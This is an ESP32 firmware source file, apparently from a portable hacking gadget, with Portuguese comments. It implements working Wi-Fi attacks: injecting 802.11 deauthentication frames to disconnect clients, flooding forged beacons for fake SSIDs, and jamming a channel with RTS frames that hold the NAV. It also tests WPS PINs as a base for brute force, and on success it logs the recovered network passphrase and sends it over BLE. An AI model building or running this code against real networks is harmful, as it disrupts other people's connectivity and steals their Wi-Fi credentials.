#include "hacking_wifi.h"
#include "tlv.h"
#include "transport_ble.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"

static const char *TAG = "hack-wifi";

// Template do frame de deauth (802.11 Mgmt subtype 0xC).
// Tamanho 26 bytes: header 802.11 (24) + reason code (2).
//
// Layout:
//   [0..1]   frame control: 0xC0 0x00 (type=Mgmt, subtype=Deauth)
//   [2..3]   duration: 0
//   [4..9]   addr1 (destination)
//   [10..15] addr2 (source) = AP BSSID
//   [16..21] addr3 (BSSID)  = AP BSSID
//   [22..23] sequence control: 0
//   [24..25] reason code (LE)
static const uint8_t s_deauth_template[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00,
};

// Header fixo do beacon (24 bytes) + body fixo (12 bytes timestamp + interval + capability).
static const uint8_t s_beacon_head[36] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0, 0, 0, 0, 0, 0, 0, 0,
    0x64, 0x00,
    0x21, 0x04,
};

#define MAX_SSIDS_PER_FLOOD  32
#define MAX_SSID_LEN         32

typedef struct {
    uint8_t target[6];
    uint8_t bssid[6];
    uint8_t channel;
    uint16_t count;
    uint16_t reason;
} deauth_job_t;

typedef struct {
    uint8_t channel;
    uint16_t cycles;
    uint8_t ssid_count;
    char ssids[MAX_SSIDS_PER_FLOOD][MAX_SSID_LEN + 1];
} beacon_job_t;

static volatile bool s_busy = false;
static volatile bool s_jam_stop = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

// RTS frame template (16 bytes total):
//   [0..1]   FC: 0xB4 0x00 (type=Ctrl, subtype=RTS)
//   [2..3]   duration (LE) — vamos usar 0x7FFF (32767 µs ≈ 33ms NAV lock)
//   [4..9]   addr1 (RA) — broadcast pra "todo mundo escutar"
//   [10..15] addr2 (TA) — nosso MAC fake
static const uint8_t s_rts_template[16] = {
    0xB4, 0x00,
    0xFF, 0x7F,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x02, 0xCA, 0xFE, 0xBE, 0xEF, 0x00,
};

typedef struct {
    uint8_t  channel;
    uint16_t duration_sec;
} jam_job_t;

bool hacking_wifi_busy(void)
{
    return s_busy;
}

esp_err_t hacking_wifi_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

static void emit_deauth_done(uint16_t sent, uint16_t requested,
                              uint8_t channel, uint16_t reason)
{
    uint8_t payload[7];
    payload[0] = (uint8_t)(sent >> 8);      payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(requested >> 8); payload[3] = (uint8_t)(requested & 0xFF);
    payload[4] = channel;
    payload[5] = (uint8_t)(reason >> 8);    payload[6] = (uint8_t)(reason & 0xFF);

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_DEAUTH_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void emit_beacon_done(uint16_t sent, uint16_t cycles,
                              uint8_t channel, uint8_t ssid_count)
{
    uint8_t payload[6];
    payload[0] = (uint8_t)(sent >> 8);   payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(cycles >> 8); payload[3] = (uint8_t)(cycles & 0xFF);
    payload[4] = channel;
    payload[5] = ssid_count;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_BEACON_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void deauth_task(void *arg)
{
    deauth_job_t *job = (deauth_job_t *)arg;

    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
    uint16_t sent = 0;

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
                 job->channel, esp_err_to_name(err));
    } else {
        uint8_t frame[sizeof(s_deauth_template)];
        memcpy(frame, s_deauth_template, sizeof(frame));
        memcpy(&frame[4],  job->target, 6);
        memcpy(&frame[10], job->bssid,  6);
        memcpy(&frame[16], job->bssid,  6);
        frame[24] = (uint8_t)(job->reason & 0xFF);
        frame[25] = (uint8_t)((job->reason >> 8) & 0xFF);

        for (uint16_t i = 0; i < job->count; i++) {
            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            if (err == ESP_OK) {
                sent++;
            } else if (i == 0) {
                ESP_LOGE(TAG, "tx rc=%s (kernel filtering deauth?)",
                         esp_err_to_name(err));
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(3));
        }
    }

    ESP_LOGI(TAG, "deauth %u/%u on ch=%u reason=%u",
             (unsigned)sent, (unsigned)job->count,
             (unsigned)job->channel, (unsigned)job->reason);

    emit_deauth_done(sent, job->count, job->channel, job->reason);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_wifi_deauth(const uint8_t target_mac[6],
                              const uint8_t ap_bssid[6],
                              uint8_t channel,
                              uint16_t count,
                              uint16_t reason_code)
{
    if (!target_mac || !ap_bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (count == 0) count = 10;
    if (count > 1000) count = 1000;
    if (reason_code == 0) reason_code = 7;

    deauth_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    memcpy(job->target, target_mac, 6);
    memcpy(job->bssid,  ap_bssid,   6);
    job->channel = channel;
    job->count = count;
    job->reason = reason_code;

    s_busy = true;
    if (xTaskCreate(deauth_task, "deauth", 4096, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

static void make_bssid(uint8_t out[6], const char *ssid, size_t idx)
{
    uint32_t h = 2166136261u;
    for (const unsigned char *p = (const unsigned char *)ssid; *p; p++) {
        h ^= *p;
        h *= 16777619u;
    }
    h ^= (uint32_t)idx * 2654435761u;
    out[0] = 0x02;
    out[1] = (uint8_t)((h >> 24) & 0xFF);
    out[2] = (uint8_t)((h >> 16) & 0xFF);
    out[3] = (uint8_t)((h >> 8) & 0xFF);
    out[4] = (uint8_t)(h & 0xFF);
    out[5] = (uint8_t)(idx & 0xFF);
}

static void beacon_task(void *arg)
{
    beacon_job_t *job = (beacon_job_t *)arg;

    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
    uint16_t sent = 0;

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
                 job->channel, esp_err_to_name(err));
    } else {
        // header(36) + ssid(2+32) + rates(6) + DS(3) + TIM(6) + ERP(3) + ExtRates(6)
        uint8_t frame[36 + 34 + 6 + 3 + 6 + 3 + 6];

        for (uint16_t cyc = 0; cyc < job->cycles; cyc++) {
            for (size_t i = 0; i < job->ssid_count; i++) {
                const char *ssid = job->ssids[i];
                size_t slen = strlen(ssid);
                if (slen > MAX_SSID_LEN) slen = MAX_SSID_LEN;

                uint8_t bssid[6];
                make_bssid(bssid, ssid, i);

                size_t off = 0;
                memcpy(&frame[off], s_beacon_head, sizeof(s_beacon_head));
                memcpy(&frame[10], bssid, 6);
                memcpy(&frame[16], bssid, 6);
                off += sizeof(s_beacon_head);

                frame[off++] = 0x00;
                frame[off++] = (uint8_t)slen;
                memcpy(&frame[off], ssid, slen);
                off += slen;

                frame[off++] = 0x01; frame[off++] = 0x04;
                frame[off++] = 0x82; frame[off++] = 0x84;
                frame[off++] = 0x8B; frame[off++] = 0x96;

                frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = job->channel;

                frame[off++] = 0x05; frame[off++] = 0x04;
                frame[off++] = 0x00; frame[off++] = 0x01;
                frame[off++] = 0x00; frame[off++] = 0x00;

                frame[off++] = 0x2A; frame[off++] = 0x01; frame[off++] = 0x00;

                frame[off++] = 0x32; frame[off++] = 0x04;
                frame[off++] = 0x0C; frame[off++] = 0x12;
                frame[off++] = 0x18; frame[off++] = 0x60;

                err = esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
                if (err == ESP_OK) sent++;
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
    }

    ESP_LOGI(TAG, "beacon_flood: %u frames (%u cycles × %u ssids) on ch=%u",
             (unsigned)sent, (unsigned)job->cycles,
             (unsigned)job->ssid_count, (unsigned)job->channel);

    emit_beacon_done(sent, job->cycles, job->channel, job->ssid_count);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

static void emit_jam_done(uint32_t sent, uint16_t duration_sec, uint8_t channel)
{
    uint8_t payload[7];
    payload[0] = (uint8_t)(sent >> 24);
    payload[1] = (uint8_t)(sent >> 16);
    payload[2] = (uint8_t)(sent >> 8);
    payload[3] = (uint8_t)(sent & 0xFF);
    payload[4] = (uint8_t)(duration_sec >> 8);
    payload[5] = (uint8_t)(duration_sec & 0xFF);
    payload[6] = channel;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_JAM_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void jam_task(void *arg)
{
    jam_job_t *job = (jam_job_t *)arg;
    int64_t deadline = esp_timer_get_time() + (int64_t)job->duration_sec * 1000000LL;

    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
    uint32_t sent = 0;

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "jam set_channel rc=%s", esp_err_to_name(err));
    } else {
        uint8_t frame[sizeof(s_rts_template)];
        memcpy(frame, s_rts_template, sizeof(frame));

        // Loop tight — RTS é frame muito curto (16B). Spamar a cada 25ms
        // mantém NAV (~33ms cada) sempre ativo no canal.
        while (!s_jam_stop && esp_timer_get_time() < deadline) {
            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            if (err == ESP_OK) sent++;
            vTaskDelay(pdMS_TO_TICKS(25));
        }
    }

    ESP_LOGI(TAG, "channel_jam done: %lu rts on ch=%u for %us",
             (unsigned long)sent, (unsigned)job->channel,
             (unsigned)job->duration_sec);

    emit_jam_done(sent, job->duration_sec, job->channel);

    free(job);
    s_jam_stop = false;
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_wifi_channel_jam(uint8_t channel, uint16_t duration_sec)
{
    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (duration_sec == 0) duration_sec = 10;
    if (duration_sec > 120) duration_sec = 120; // cap p/ não fritar a placa

    jam_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    job->channel = channel;
    job->duration_sec = duration_sec;

    s_busy = true;
    s_jam_stop = false;
    if (xTaskCreate(jam_task, "channel_jam", 3072, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t hacking_wifi_channel_jam_stop(void)
{
    if (!s_busy) return ESP_ERR_INVALID_STATE;
    s_jam_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// WPS PIN test (1 attempt) — base pra brute force lado-app
// ----------------------------------------------------------------------

#define WPS_BIT_DONE   (1 << 0)

typedef struct {
    uint8_t  bssid[6];
    char     pin[9]; // 8 chars + NUL
    uint16_t timeout_sec;
} wps_job_t;

static EventGroupHandle_t s_wps_evg = NULL;
static volatile int s_wps_event_id = -1;
static wifi_event_sta_wps_er_success_t s_wps_success = {0};
static wifi_event_sta_wps_fail_reason_t s_wps_fail_reason = WPS_FAIL_REASON_NORMAL;
static esp_event_handler_instance_t s_wps_handler_instance = NULL;

static void wps_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data)
{
    (void)arg;
    if (base != WIFI_EVENT) return;
    switch (id) {
    case WIFI_EVENT_STA_WPS_ER_SUCCESS:
        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_SUCCESS;
        if (data) memcpy(&s_wps_success, data, sizeof(s_wps_success));
        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
        break;
    case WIFI_EVENT_STA_WPS_ER_FAILED:
        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_FAILED;
        s_wps_fail_reason = data ? *(wifi_event_sta_wps_fail_reason_t *)data
                                  : WPS_FAIL_REASON_NORMAL;
        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
        break;
    case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_TIMEOUT;
        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
        break;
    case WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP:
        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP;
        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
        break;
    default:
        break;
    }
}

// status no TLV: 0=success, 1=failed (com fail_reason), 2=timeout, 3=pbc_overlap, 4=internal_error
static void emit_wps_done(const uint8_t bssid[6], uint8_t status,
                           uint8_t fail_reason,
                           const char *ssid, size_t ssid_len,
                           const char *psk, size_t psk_len)
{
    uint8_t payload[6 + 1 + 1 + 1 + 32 + 1 + 64];
    size_t off = 0;
    memcpy(&payload[off], bssid, 6); off += 6;
    payload[off++] = status;
    payload[off++] = fail_reason;
    if (ssid_len > 32) ssid_len = 32;
    payload[off++] = (uint8_t)ssid_len;
    if (ssid_len) { memcpy(&payload[off], ssid, ssid_len); off += ssid_len; }
    if (psk_len > 64) psk_len = 64;
    payload[off++] = (uint8_t)psk_len;
    if (psk_len) { memcpy(&payload[off], psk, psk_len); off += psk_len; }

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_WPS_TEST_DONE, s_seq++,
                           payload, off);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void wps_test_task(void *arg)
{
    wps_job_t *job = (wps_job_t *)arg;
    uint8_t status = 4; // internal error por default
    uint8_t fail_reason = 0;
    const char *ssid = "";
    size_t ssid_len = 0;
    const char *psk = "";
    size_t psk_len = 0;

    s_wps_evg = xEventGroupCreate();
    if (!s_wps_evg) {
        ESP_LOGE(TAG, "wps: event group alloc failed");
        goto emit;
    }
    s_wps_event_id = -1;
    memset(&s_wps_success, 0, sizeof(s_wps_success));

    esp_err_t err = esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &wps_event_handler,
        NULL, &s_wps_handler_instance);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wps: event register rc=%s", esp_err_to_name(err));
        goto cleanup_evg;
    }

    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
    strncpy(cfg.pin, job->pin, sizeof(cfg.pin) - 1);
    cfg.pin[sizeof(cfg.pin) - 1] = 0;

    err = esp_wifi_wps_enable(&cfg);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wps_enable rc=%s", esp_err_to_name(err));
        goto cleanup_handler;
    }
    err = esp_wifi_wps_start(0);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wps_start rc=%s", esp_err_to_name(err));
        esp_wifi_wps_disable();
        goto cleanup_handler;
    }

    EventBits_t bits = xEventGroupWaitBits(s_wps_evg, WPS_BIT_DONE,
                                            pdTRUE, pdFALSE,
                                            pdMS_TO_TICKS(job->timeout_sec * 1000));
    if (!(bits & WPS_BIT_DONE)) {
        ESP_LOGW(TAG, "wps: timeout no event group");
        status = 2;
    } else {
        switch (s_wps_event_id) {
        case WIFI_EVENT_STA_WPS_ER_SUCCESS:
            status = 0;
            // Pega 1ª credencial (struct anônimo com ssid + passphrase)
            if (s_wps_success.ap_cred_cnt > 0) {
                ssid = (const char *)s_wps_success.ap_cred[0].ssid;
                ssid_len = strnlen(ssid, MAX_SSID_LEN);
                psk = (const char *)s_wps_success.ap_cred[0].passphrase;
                psk_len = strnlen(psk, MAX_PASSPHRASE_LEN);
                ESP_LOGI(TAG, "wps SUCCESS: ssid='%.*s' psk='%.*s'",
                         (int)ssid_len, ssid, (int)psk_len, psk);
            }
            break;
        case WIFI_EVENT_STA_WPS_ER_FAILED:
            status = 1;
            fail_reason = (uint8_t)s_wps_fail_reason;
            ESP_LOGI(TAG, "wps FAILED reason=%u", fail_reason);
            break;
        case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
            status = 2;
            ESP_LOGI(TAG, "wps TIMEOUT");
            break;
        case WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP:
            status = 3;
            ESP_LOGI(TAG, "wps PBC_OVERLAP");
            break;
        }
    }

    esp_wifi_wps_disable();

cleanup_handler:
    esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                           s_wps_handler_instance);
    s_wps_handler_instance = NULL;
cleanup_evg:
    vEventGroupDelete(s_wps_evg);
    s_wps_evg = NULL;
emit:
    emit_wps_done(job->bssid, status, fail_reason,
                  ssid, ssid_len, psk, psk_len);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_wifi_wps_pin_test(const uint8_t bssid[6],
                                    const char *pin,
                                    uint16_t timeout_sec)
{
    if (!bssid || !pin) return ESP_ERR_INVALID_ARG;
    if (strlen(pin) != 8) return ESP_ERR_INVALID_ARG;
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (timeout_sec == 0)   timeout_sec = 60;
    if (timeout_sec < 15)   timeout_sec = 15;
    if (timeout_sec > 120)  timeout_sec = 120;

    wps_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    memcpy(job->bssid, bssid, 6);
    memcpy(job->pin, pin, 8);
    job->pin[8] = 0;
    job->timeout_sec = timeout_sec;

    s_busy = true;
    if (xTaskCreate(wps_test_task, "wps_test", 6144, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "wps_pin_test: bssid=%02x:%02x:%02x:%02x:%02x:%02x pin=%s timeout=%us",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             job->pin, (unsigned)timeout_sec);
    return ESP_OK;
}

esp_err_t hacking_wifi_beacon_flood(uint8_t channel,
                                    uint16_t cycles,
                                    const char *const *ssids,
                                    size_t ssid_count)
{
    if (channel == 0 || channel > 14 || !ssids || ssid_count == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (ssid_count > MAX_SSIDS_PER_FLOOD) ssid_count = MAX_SSIDS_PER_FLOOD;
    if (cycles == 0) cycles = 50;
    if (cycles > 200) cycles = 200;

    beacon_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    job->channel = channel;
    job->cycles = cycles;
    job->ssid_count = (uint8_t)ssid_count;
    for (size_t i = 0; i < ssid_count; i++) {
        const char *src = ssids[i] ? ssids[i] : "";
        strncpy(job->ssids[i], src, MAX_SSID_LEN);
        job->ssids[i][MAX_SSID_LEN] = 0;
    }

    s_busy = true;
    // Stack maior — frame array tem ~94 bytes + cJSON na call chain anterior.
    if (xTaskCreate(beacon_task, "beacon_flood", 4096, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
